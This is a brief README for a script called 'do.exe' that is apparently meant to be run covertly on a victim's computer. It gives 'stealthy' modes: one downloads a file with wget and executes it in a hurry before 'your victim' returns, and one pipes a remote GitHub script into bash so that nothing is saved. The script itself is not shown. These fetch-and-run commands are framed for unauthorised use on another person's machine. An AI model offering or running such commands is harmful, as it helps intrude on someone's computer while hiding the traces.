# do.exe

## Get started

```
bash features.sh
```

## Stealthy mod

### Speed mod

You are in a panic state, your victim can come from one moment to another and you need to execute the script at full speed without go in GitHub:
```
wget croissant.do.umontp.fr && bash index.html
```

### No trace

Run the script without saving the script file, and without using dns:

```
bash <(curl https://raw.githubusercontent.com/LeoDevSecOps/do.exe/main/features.sh)
```
